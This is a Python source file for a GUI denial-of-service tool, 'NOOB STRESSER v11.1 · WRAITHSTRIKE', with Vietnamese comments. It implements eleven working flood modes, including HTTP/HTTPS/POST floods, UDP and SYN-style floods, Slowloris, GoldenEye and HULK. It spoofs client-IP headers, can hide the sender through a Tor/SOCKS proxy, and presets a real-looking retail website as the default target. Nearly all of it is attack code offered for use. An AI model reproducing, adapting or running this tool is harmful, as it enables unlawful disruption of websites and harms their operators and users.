"""
NOOB STRESSER v11.1 — WRAITHSTRIKE
GUI bằng Python (tkinter) chạy trên PyCharm / Windows / Linux
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import socket
import ssl
import time
import random
import string
import struct
import gc
import sys
import subprocess

# ── system optimizer ─────────────────────────────────────────────────────────
def _optimize():
    threading.stack_size(65536)
    socket.setdefaulttimeout(2)
    gc.collect()
    gc.disable()
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.winmm.timeBeginPeriod(1)
        except: pass

_optimize()

# ── globals ─────────────────────────────────────────────────────────────────
_PROXY_ENABLED = False
_PROXY_HOST    = "127.0.0.1"
_PROXY_PORT    = 9050
_PROXY_TYPE    = "socks5"

# ── auto-install PySocks nếu chưa có ─────────────────────────────────────────
def _ensure_socks():
    try:
        import socks
        return True, socks
    except ImportError:
        pass
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "PySocks", "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        import socks
        return True, socks
    except Exception:
        return False, None

SOCKS_OK, _socks_mod = _ensure_socks()
if SOCKS_OK:
    import socks

# ── 1000 fake IP pool (pre-generated) ────────────────────────────────────────
_IP_POOL = []
def _build_pool(n=1000):
    seen = set()
    while len(_IP_POOL) < n:
        a = random.randint(1, 254)
        if a in (10, 127, 172, 192): continue
        ip = f"{a}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        if ip not in seen:
            seen.add(ip); _IP_POOL.append(ip)
_build_pool()

def _rip(): return random.choice(_IP_POOL)

# ── socket factory ──────────────────────────────────────────────────────────
def _make_socket(udp=False):
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    if not udp and _PROXY_ENABLED and SOCKS_OK:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        ptype = socks.SOCKS5 if _PROXY_TYPE == "socks5" else (
                socks.SOCKS4 if _PROXY_TYPE == "socks4" else socks.HTTP)
        try:
            s.set_proxy(ptype, _PROXY_HOST, _PROXY_PORT)
        except Exception:
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return s
    s = socket.socket(socket.AF_INET, kind)
    if not udp:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
    else:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
    return s

# ── headers ──────────────────────────────────────────────────────────────────
AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.7.1", "python-requests/2.31.0", "Go-http-client/2.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
]

PATHS = [
    "/", "/index.html", "/index.php", "/home", "/about",
    "/login", "/signin", "/register", "/signup",
    "/api/v1/status", "/api/v2/health", "/api/users",
    "/wp-admin", "/wp-login.php", "/admin", "/admin/login",
    "/.env", "/config", "/api/data", "/dashboard",
    "/search", "/products", "/shop", "/checkout",
    "/static/js/main.js", "/static/css/main.css",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.facebook.com/",
    "https://www.reddit.com/r/",
    "https://t.co/",
    "https://www.youtube.com/",
    "https://www.instagram.com/",
    "https://news.ycombinator.com/",
    "https://duckduckgo.com/?q=",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "*",
]

_RAND_WORDS = ["news","shop","blog","page","info","data","user","home","api","feed"]

def _fake_headers():
    f1, f2, f3 = _rip(), _rip(), _rip()
    ref  = random.choice(REFERERS) + "".join(random.choices(string.ascii_lowercase, k=6))
    sec_site = random.choice(["cross-site", "same-origin", "same-site", "none"])
    sec_dest = random.choice(["document", "empty", "image", "script", "style"])
    return (
        f"X-Forwarded-For: {f1}, {f2}, {f3}\r\n"
        f"X-Real-IP: {f1}\r\n"
        f"X-Client-IP: {f2}\r\n"
        f"CF-Connecting-IP: {f1}\r\n"
        f"True-Client-IP: {f1}\r\n"
        f"X-Originating-IP: {f3}\r\n"
        f"Forwarded: for={f1};proto=https;by={f2}\r\n"
        f"Via: 1.1 {f2} (squid/5.7)\r\n"
        f"Referer: {ref}\r\n"
        f"DNT: {random.randint(0,1)}\r\n"
        f"Upgrade-Insecure-Requests: 1\r\n"
        f"Sec-Fetch-Site: {sec_site}\r\n"
        f"Sec-Fetch-Mode: navigate\r\n"
        f"Sec-Fetch-Dest: {sec_dest}\r\n"
        f"Sec-Fetch-User: ?1\r\n"
        f"Sec-CH-UA: \"Chromium\";v=\"{random.randint(110,124)}\"\r\n"
        f"Sec-CH-UA-Mobile: ?{random.randint(0,1)}\r\n"
        f"Sec-CH-UA-Platform: \"{random.choice(['Windows','Linux','macOS','Android'])}\"\r\n"
        f"Cookie: session={random.randbytes(16).hex()}; _ga=GA1.1.{random.randint(10**8,10**9-1)}.{int(time.time())-random.randint(0,86400*30)}\r\n"
        f"TE: trailers\r\n"
    )

def _req(host, keep=True, method="GET"):
    rand_k = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    path   = random.choice(PATHS) + f"?{rand_k}={random.randint(1, 999999)}&_={int(time.time()*1000)}"
    conn   = "keep-alive" if keep else "close"
    lang   = random.choice(ACCEPT_LANGS)
    enc    = random.choice(["gzip, deflate, br", "gzip, deflate", "br;q=1.0, gzip;q=0.8"])

    if method == "POST":
        body_data = "&".join(
            f"{random.choice(_RAND_WORDS)}={random.randbytes(8).hex()}"
            for _ in range(random.randint(3, 8))
        )
        body = body_data.encode()
        return (
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {random.choice(AGENTS)}\r\n"
            f"Accept: application/json, text/plain, */*\r\n"
            f"Accept-Encoding: {enc}\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Cache-Control: no-cache, no-store\r\n"
            f"Pragma: no-cache\r\n"
            f"Connection: {conn}\r\n"
            + _fake_headers() + "\r\n"
        ).encode() + body

    # GET
    return (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: {random.choice(AGENTS)}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        f"Accept-Encoding: {enc}\r\n"
        f"Accept-Language: {lang}\r\n"
        f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        f"Pragma: no-cache\r\n"
        f"Range: bytes=0-\r\n"
        f"Connection: {conn}\r\n"
        + _fake_headers() + "\r\n"
    ).encode()

# ── attack functions ─────────────────────────────────────────────────────────
def _http_flood(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        try:
            s = _make_socket()
            s.settimeout(2)
            s.connect((host, port))
            method = random.choice(["GET", "GET", "GET", "POST"])
            payload = _req(host, keep=True, method=method)
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(payload)
                stats["sent"] += 1
            s.close()
        except Exception:
            stats["errors"] += 1

def _https_flood(host, port, stats, stop_ev):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("ALL:@SECLEVEL=0")
    while not stop_ev.is_set():
        try:
            raw = _make_socket()
            raw.settimeout(2)
            raw.connect((host, port))
            s = ctx.wrap_socket(raw, server_hostname=host)
            method = random.choice(["GET", "GET", "POST"])
            payload = _req(host, keep=True, method=method)
            for _ in range(150):
                if stop_ev.is_set(): break
                s.send(payload)
                stats["sent"] += 1
            s.close()
        except Exception:
            stats["errors"] += 1

def _post_flood(host, port, stats, stop_ev):
    """Thuần POST flood — nhắm API endpoint, JSON body lớn"""
    while not stop_ev.is_set():
        try:
            s = _make_socket()
            s.settimeout(2)
            s.connect((host, port))
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(_req(host, keep=True, method="POST"))
                stats["sent"] += 1
            s.close()
        except Exception:
            stats["errors"] += 1

def _udp_flood(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    s = _make_socket(udp=True)
    sizes = list(range(512, 65508, 512))
    while not stop_ev.is_set():
        try:
            s.sendto(random.randbytes(random.choice(sizes)), (ip, port))
            stats["sent"] += 1
        except Exception:
            stats["errors"] += 1

def _syn_flood(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    while not stop_ev.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((ip, port))
            stats["sent"] += 1
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()
        except Exception:
            stats["errors"] += 1

def _slowloris(host, port, stats, stop_ev):
    sockets = []
    for _ in range(400):
        if stop_ev.is_set(): break
        try:
            s = _make_socket(); s.settimeout(4)
            s.connect((host, port))
            s.send((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                    f"X-Forwarded-For: {_rip()}\r\nUser-Agent: {random.choice(AGENTS)}\r\n").encode())
            sockets.append(s); stats["sent"] += 1
        except: pass
    while not stop_ev.is_set():
        for s in list(sockets):
            try:
                s.send(f"X-a: {_rip()}\r\n".encode()); stats["sent"] += 1
            except:
                sockets.remove(s); stats["errors"] += 1
                try:
                    ns = _make_socket(); ns.settimeout(4)
                    ns.connect((host, port))
                    ns.send((f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n"
                             f"X-Forwarded-For: {_rip()}\r\n").encode())
                    sockets.append(ns)
                except: pass
        time.sleep(8)
    for s in sockets:
        try: s.close()
        except: pass

def _rapid_reset(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    while not stop_ev.is_set():
        try:
            s = _make_socket(); s.settimeout(0.5)
            s.connect((ip, port))
            s.send(_req(host, keep=False))
            stats["sent"] += 1
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()
        except Exception:
            stats["errors"] += 1

def _cache_bypass(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        try:
            s = _make_socket(); s.settimeout(2)
            s.connect((host, port))
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
            req = (f"GET /?nocache={rand} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Cache-Control: no-cache, no-store\r\nPragma: no-cache\r\n"
                   f"User-Agent: {random.choice(AGENTS)}\r\n"
                   + _fake_headers() + "\r\n").encode()
            for _ in range(100):
                if stop_ev.is_set(): break
                s.send(req); stats["sent"] += 1
            s.close()
        except Exception:
            stats["errors"] += 1

def _goldeneye(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        try:
            s = _make_socket(); s.settimeout(4)
            s.connect((host, port))
            s.send((f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: {random.choice(AGENTS)}\r\n"
                    f"Connection: keep-alive\r\nKeep-Alive: 900\r\n"
                    + _fake_headers()).encode())
            for _ in range(50):
                if stop_ev.is_set(): break
                s.send(b"X-padding: " + random.randbytes(64) + b"\r\n")
                stats["sent"] += 1
                time.sleep(0.3)
            s.close()
        except Exception:
            stats["errors"] += 1

def _hulk(host, port, stats, stop_ev):
    while not stop_ev.is_set():
        try:
            s = _make_socket(); s.settimeout(2)
            s.connect((host, port))
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            req = (f"GET /?{rand}={rand} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {random.choice(AGENTS)}\r\n"
                   f"Accept-Encoding: gzip, deflate, br\r\n"
                   f"Accept-Language: en-US,en;q=0.{random.randint(1,9)}\r\n"
                   f"Referer: https://www.google.com/?q={rand}\r\n"
                   f"Connection: keep-alive\r\n"
                   + _fake_headers() + "\r\n").encode()
            for _ in range(200):
                if stop_ev.is_set(): break
                s.send(req); stats["sent"] += 1
            s.close()
        except Exception:
            stats["errors"] += 1

def _garbage(host, port, stats, stop_ev):
    try: ip = socket.gethostbyname(host)
    except: ip = host
    s = _make_socket(udp=True)
    while not stop_ev.is_set():
        try:
            s.sendto(random.randbytes(65507), (ip, port))
            stats["sent"] += 1
        except Exception:
            stats["errors"] += 1

ATTACK_MAP = {
    "HTTP Flood":      _http_flood,
    "HTTPS Flood":     _https_flood,
    "POST Flood":      _post_flood,
    "UDP Flood":       _udp_flood,
    "SYN Flood":       _syn_flood,
    "Slowloris":       _slowloris,
    "Rapid Reset":     _rapid_reset,
    "Cache Bypass":    _cache_bypass,
    "GoldenEye":       _goldeneye,
    "HULK":            _hulk,
    "Garbage Payload": _garbage,
}

def _spawn_threads(fn, host, port, count, stop_ev, stats):
    """Batch spawn như v7 — tránh spike RAM/CPU."""
    batch = 150
    spawned = 0; failed = 0
    for i in range(0, count, batch):
        if stop_ev.is_set(): break
        b = min(batch, count - i)
        for _ in range(b):
            try:
                t = threading.Thread(target=fn,
                                     args=(host, port, stats, stop_ev),
                                     daemon=True)
                t.start(); spawned += 1; failed = 0
            except (RuntimeError, OSError):
                failed += 1
                if failed >= 3: return
        time.sleep(0.01 + spawned / 100000)

# ── GUI ──────────────────────────────────────────────────────────────────────
class NoobGUI:
    RED    = "#ff2222"
    DARK   = "#0a0a0a"
    CARD   = "#111111"
    DIM    = "#555555"
    GREEN  = "#00cc66"
    CYAN   = "#00ccff"
    YELLOW = "#ffcc00"
    BORDER = "#2a0000"
    FG     = "#dddddd"
    FONT   = ("Consolas", 10)
    FONT_B = ("Consolas", 10, "bold")
    FONT_T = ("Consolas", 16, "bold")

    MODES = [
        ("HTTP Flood",      "L7", "★★★★☆"),
        ("HTTPS Flood",     "L7", "★★★★★"),
        ("POST Flood",      "L7", "★★★★☆"),
        ("UDP Flood",       "L4", "★★★☆☆"),
        ("SYN Flood",       "L4", "★★★☆☆"),
        ("Slowloris",       "L7", "★★★★☆"),
        ("Rapid Reset",     "L4", "★★★☆☆"),
        ("Cache Bypass",    "L7", "★★★★☆"),
        ("GoldenEye",       "L7", "★★★★☆"),
        ("HULK",            "L7", "★★★★★"),
        ("Garbage Payload", "L4", "★★★☆☆"),
    ]

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("NOOB STRESSER v11.1 · WRAITHSTRIKE")
        self.root.configure(bg=self.DARK)
        self.root.geometry("900x720")
        self.root.resizable(True, True)

        self._stop_ev   = threading.Event()
        self._threads   = []
        self._running   = False
        self._stats     = {"sent": 0, "errors": 0}
        self._start_ts  = 0

        self._build_ui()
        self.root.mainloop()

    # ── build ────────────────────────────────────────────────────────────────
    def _build_ui(self):
        r = self.root
        # header
        hdr = tk.Frame(r, bg=self.DARK, pady=10)
        hdr.pack(fill="x")
        tk.Label(hdr, text="☠  NOOB STRESSER  ☠", bg=self.DARK,
                 fg=self.RED, font=("Consolas", 22, "bold")).pack()
        tk.Label(hdr, text="v11.1  ·  WRAITHSTRIKE  ·  11 MODES",
                 bg=self.DARK, fg=self.DIM, font=("Consolas", 9)).pack()

        # divider
        tk.Frame(r, bg=self.BORDER, height=1).pack(fill="x", padx=20)

        # main area (left + right)
        body = tk.Frame(r, bg=self.DARK)
        body.pack(fill="both", expand=True, padx=10, pady=6)

        left  = tk.Frame(body, bg=self.DARK)
        right = tk.Frame(body, bg=self.DARK)
        left.pack(side="left", fill="both", expand=True)
        right.pack(side="left", fill="y", padx=(8, 0))

        self._build_modes(left)
        self._build_config(left)
        self._build_proxy(right)
        self._build_stats(right)
        self._build_launch(right)
        self._build_log(r)

    def _label(self, parent, text, fg=None, font=None, **kw):
        return tk.Label(parent, text=text, bg=self.DARK,
                        fg=fg or self.FG, font=font or self.FONT, **kw)

    def _section(self, parent, title):
        f = tk.Frame(parent, bg=self.DARK)
        f.pack(fill="x", pady=(8, 2))
        tk.Frame(f, bg=self.BORDER, height=1).pack(fill="x")
        tk.Label(f, text=f"  {title}", bg=self.DARK,
                 fg=self.RED, font=("Consolas", 9, "bold"),
                 anchor="w").pack(fill="x")
        tk.Frame(f, bg=self.BORDER, height=1).pack(fill="x")
        return f

    def _entry(self, parent, default="", w=18):
        e = tk.Entry(parent, bg=self.CARD, fg=self.FG,
                     insertbackground=self.RED, relief="flat",
                     font=self.FONT, width=w,
                     highlightthickness=1,
                     highlightbackground=self.BORDER,
                     highlightcolor=self.RED)
        e.insert(0, default)
        return e

    # ── modes ────────────────────────────────────────────────────────────────
    def _build_modes(self, parent):
        self._section(parent, "◈ SELECT MODE")
        grid = tk.Frame(parent, bg=self.DARK)
        grid.pack(fill="x", padx=4)
        self._mode_var = tk.StringVar(value="HTTP Flood")
        self._mode_btns = {}
        cols = 5
        for i, (name, layer, stars) in enumerate(self.MODES):
            r, c = divmod(i, cols)
            card = tk.Frame(grid, bg=self.CARD,
                            highlightthickness=1,
                            highlightbackground=self.BORDER,
                            cursor="hand2", padx=6, pady=4)
            card.grid(row=r, column=c, padx=3, pady=3, sticky="nsew")
            grid.columnconfigure(c, weight=1)

            lyr_col = self.GREEN if layer == "L7" else self.CYAN
            tk.Label(card, text=f"[{i+1 if i<9 else 0}]",
                     bg=self.CARD, fg=self.YELLOW,
                     font=("Consolas", 8)).pack(anchor="w")
            tk.Label(card, text=name,
                     bg=self.CARD, fg=self.FG,
                     font=("Consolas", 9, "bold")).pack(anchor="w")
            tk.Label(card, text=f"{layer}  {stars}",
                     bg=self.CARD, fg=lyr_col,
                     font=("Consolas", 8)).pack(anchor="w")

            self._mode_btns[name] = card
            card.bind("<Button-1>", lambda e, n=name: self._select_mode(n))
            for child in card.winfo_children():
                child.bind("<Button-1>", lambda e, n=name: self._select_mode(n))
        self._select_mode("HTTP Flood")

    def _select_mode(self, name):
        self._mode_var.set(name)
        for n, card in self._mode_btns.items():
            col = self.BORDER if n != name else self.RED
            card.configure(highlightbackground=col,
                           bg="#1a0000" if n == name else self.CARD)
            for child in card.winfo_children():
                child.configure(bg="#1a0000" if n == name else self.CARD)

    # ── config ───────────────────────────────────────────────────────────────
    def _build_config(self, parent):
        self._section(parent, "◈ CONFIG")
        row = tk.Frame(parent, bg=self.DARK)
        row.pack(fill="x", padx=4, pady=2)

        def field(label, default, w=14):
            f = tk.Frame(row, bg=self.DARK)
            f.pack(side="left", padx=6)
            tk.Label(f, text=label, bg=self.DARK,
                     fg=self.DIM, font=("Consolas", 8)).pack(anchor="w")
            e = self._entry(f, default, w)
            e.pack()
            return e

        self.e_target   = field("TARGET",   "avakids.com", 20)
        self.e_port     = field("PORT",     "443", 6)
        self.e_threads  = field("THREADS",  "500", 6)
        self.e_duration = field("DURATION", "60",  6)

    # ── proxy ────────────────────────────────────────────────────────────────
    def _build_proxy(self, parent):
        self._section(parent, "◈ PROXY / TOR")
        f = tk.Frame(parent, bg=self.DARK, padx=4)
        f.pack(fill="x")

        self.v_proxy_on = tk.BooleanVar(value=False)
        tk.Checkbutton(f, text="Ẩn IP qua Proxy / Tor",
                       variable=self.v_proxy_on,
                       bg=self.DARK, fg=self.FG,
                       selectcolor=self.CARD,
                       activebackground=self.DARK,
                       activeforeground=self.RED,
                       font=self.FONT,
                       command=self._toggle_proxy).pack(anchor="w")

        prow = tk.Frame(f, bg=self.DARK)
        prow.pack(fill="x", pady=4)

        tk.Label(prow, text="TYPE", bg=self.DARK,
                 fg=self.DIM, font=("Consolas", 8)).grid(row=0, column=0, padx=3)
        tk.Label(prow, text="HOST", bg=self.DARK,
                 fg=self.DIM, font=("Consolas", 8)).grid(row=0, column=1, padx=3)
        tk.Label(prow, text="PORT", bg=self.DARK,
                 fg=self.DIM, font=("Consolas", 8)).grid(row=0, column=2, padx=3)

        self.v_proxy_type = tk.StringVar(value="socks5")
        cb = ttk.Combobox(prow, textvariable=self.v_proxy_type,
                          values=["socks5", "socks4", "http"],
                          width=7, state="readonly",
                          font=self.FONT)
        cb.grid(row=1, column=0, padx=3)

        self.e_proxy_host = self._entry(prow, "127.0.0.1", 13)
        self.e_proxy_host.grid(row=1, column=1, padx=3)

        self.e_proxy_port = self._entry(prow, "9050", 5)
        self.e_proxy_port.grid(row=1, column=2, padx=3)

        # socks status
        socks_txt = f"PySocks: {'OK ✓ (auto-installed)' if SOCKS_OK else 'FAILED — install manually: pip install PySocks'}"
        socks_col = self.GREEN if SOCKS_OK else self.RED
        tk.Label(f, text=socks_txt, bg=self.DARK,
                 fg=socks_col, font=("Consolas", 8)).pack(anchor="w", pady=2)

    def _toggle_proxy(self):
        pass  # state read at launch time

    # ── stats ────────────────────────────────────────────────────────────────
    def _build_stats(self, parent):
        self._section(parent, "◈ STATS")
        grid = tk.Frame(parent, bg=self.DARK, padx=4)
        grid.pack(fill="x")

        def stat_box(label, col_val, col=0):
            f = tk.Frame(grid, bg=self.CARD,
                         highlightthickness=1,
                         highlightbackground=self.BORDER,
                         padx=8, pady=4)
            f.grid(row=0, column=col, padx=3, pady=3, sticky="ew")
            grid.columnconfigure(col, weight=1)
            tk.Label(f, text=label, bg=self.CARD,
                     fg=self.DIM, font=("Consolas", 8)).pack()
            v = tk.StringVar(value="0")
            tk.Label(f, textvariable=v, bg=self.CARD,
                     fg=col_val, font=("Consolas", 14, "bold")).pack()
            return v

        self.v_sent   = stat_box("SENT",   self.RED,    0)
        self.v_errors = stat_box("ERRORS", "#ff6600",   1)
        self.v_rps    = stat_box("RPS",    self.GREEN,  2)
        self.v_remain = stat_box("REMAIN", self.CYAN,   3)

        # progress bar
        self.pb_frame = tk.Frame(parent, bg=self.DARK, padx=4)
        self.pb_frame.pack(fill="x", pady=4)
        self._pb_canvas = tk.Canvas(self.pb_frame, height=10,
                                    bg=self.CARD,
                                    highlightthickness=1,
                                    highlightbackground=self.BORDER)
        self._pb_canvas.pack(fill="x")
        self._pb_bar = self._pb_canvas.create_rectangle(
            0, 0, 0, 10, fill=self.RED, outline="")

    def _update_pb(self, pct):
        self._pb_canvas.update_idletasks()
        w = self._pb_canvas.winfo_width()
        self._pb_canvas.coords(self._pb_bar, 0, 0, int(w * pct), 10)

    # ── launch btn ───────────────────────────────────────────────────────────
    def _build_launch(self, parent):
        self._section(parent, "◈ CONTROL")
        f = tk.Frame(parent, bg=self.DARK, padx=4)
        f.pack(fill="x")

        self.btn_launch = tk.Button(
            f, text="▶  LAUNCH",
            bg=self.CARD, fg=self.RED,
            font=("Consolas", 13, "bold"),
            relief="flat", bd=0,
            highlightthickness=2,
            highlightbackground=self.RED,
            activebackground="#1a0000",
            activeforeground=self.RED,
            cursor="hand2",
            command=self._toggle_attack,
            padx=20, pady=10
        )
        self.btn_launch.pack(fill="x", pady=4)

    # ── log ──────────────────────────────────────────────────────────────────
    def _build_log(self, parent):
        tk.Frame(parent, bg=self.BORDER, height=1).pack(fill="x", padx=10)
        tk.Label(parent, text="  ◈ LOG", bg=self.DARK,
                 fg=self.RED, font=("Consolas", 9, "bold"),
                 anchor="w").pack(fill="x", padx=10)

        self.log_box = scrolledtext.ScrolledText(
            parent, height=7,
            bg="#050505", fg="#888888",
            font=("Consolas", 9),
            relief="flat", bd=0,
            insertbackground=self.RED,
            state="disabled"
        )
        self.log_box.pack(fill="x", padx=10, pady=(2, 8))
        self.log_box.tag_config("ok",    foreground=self.GREEN)
        self.log_box.tag_config("warn",  foreground=self.YELLOW)
        self.log_box.tag_config("error", foreground=self.RED)
        self.log_box.tag_config("stat",  foreground=self.CYAN)
        self.log_box.tag_config("info",  foreground="#888888")

        self._log("[NOOB STRESSER v11.1 · WRAITHSTRIKE] ready", "ok")
        self._log("[SYS] select mode → config → LAUNCH", "info")
        if SOCKS_OK:
            self._log("[SYS] PySocks OK — proxy/Tor sẵn sàng", "ok")
        else:
            self._log("[!] PySocks install thất bại — chạy: pip install PySocks", "error")

    def _log(self, msg, tag="info"):
        ts = time.strftime("%H:%M:%S")
        self.log_box.configure(state="normal")
        self.log_box.insert("end", f"[{ts}] {msg}\n", tag)
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    # ── attack control ───────────────────────────────────────────────────────
    def _toggle_attack(self):
        if not self._running:
            self._start()
        else:
            self._stop()

    def _start(self):
        global _PROXY_ENABLED, _PROXY_HOST, _PROXY_PORT, _PROXY_TYPE

        host = self.e_target.value   if hasattr(self.e_target, 'value') else self.e_target.get().strip()
        host = self.e_target.get().strip()
        if not host:
            self._log("[!] Nhập target trước", "error"); return

        try:
            port = int(self.e_port.get())
        except ValueError:
            port = 80

        try:
            threads = max(1, min(int(self.e_threads.get()), 2000))
        except ValueError:
            threads = 100

        try:
            duration = max(1, int(self.e_duration.get()))
        except ValueError:
            duration = 60

        _PROXY_ENABLED = self.v_proxy_on.get()
        _PROXY_HOST    = self.e_proxy_host.get().strip() or "127.0.0.1"
        _PROXY_TYPE    = self.v_proxy_type.get()
        try:
            _PROXY_PORT = int(self.e_proxy_port.get())
        except ValueError:
            _PROXY_PORT = 9050

        mode = self._mode_var.get()
        fn   = ATTACK_MAP.get(mode)
        if not fn:
            self._log(f"[!] Mode không hợp lệ: {mode}", "error"); return

        self._running  = True
        self._stop_ev  = threading.Event()
        self._stats    = {"sent": 0, "errors": 0}
        self._start_ts = time.time()
        self._duration = duration
        self._threads  = []

        self.btn_launch.configure(text="■  STOP", fg=self.DIM,
                                  highlightbackground=self.DIM)

        proxy_info = f" | proxy={_PROXY_HOST}:{_PROXY_PORT}" if _PROXY_ENABLED else ""
        self._log(f"[▶] {threads}t → {host}:{port} | {duration}s | {mode}{proxy_info}", "ok")

        # batch spawn trong background — không block GUI
        threading.Thread(
            target=_spawn_threads,
            args=(fn, host, port, threads, self._stop_ev, self._stats),
            daemon=True
        ).start()
        self.root.after(500, self._tick_stats, duration)

    def _stop(self):
        self._stop_ev.set()
        self._running = False
        gc.enable()   # bật lại GC sau attack
        s = self._stats
        elapsed = max(time.time() - self._start_ts, 0.1)
        rps = int(s["sent"] / elapsed)
        self._log(f"[■] Done — sent:{s['sent']:,} err:{s['errors']:,} avg:{rps} rps", "ok")
        self.btn_launch.configure(text="▶  LAUNCH", fg=self.RED,
                                  highlightbackground=self.RED)
        self.v_remain.set("0s")
        self._update_pb(1.0)

    def _tick_stats(self, duration):
        if not self._running:
            return
        elapsed = time.time() - self._start_ts
        remain  = max(0, duration - elapsed)
        s       = self._stats
        rps     = int(s["sent"] / max(elapsed, 0.1))

        self.v_sent.set(f"{s['sent']:,}")
        self.v_errors.set(f"{s['errors']:,}")
        self.v_rps.set(f"{rps:,}")
        self.v_remain.set(f"{int(remain)}s")
        self._update_pb(min(elapsed / duration, 1.0))

        if int(elapsed) % 5 == 0 and int(elapsed) > 0:
            self._log(
                f"[STAT] sent:{s['sent']:,} err:{s['errors']:,} rps:{rps:,} remain:{int(remain)}s",
                "stat"
            )

        if remain <= 0:
            self._stop()
        else:
            self.root.after(500, self._tick_stats, duration)


# ── entry point ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    NoobGUI()
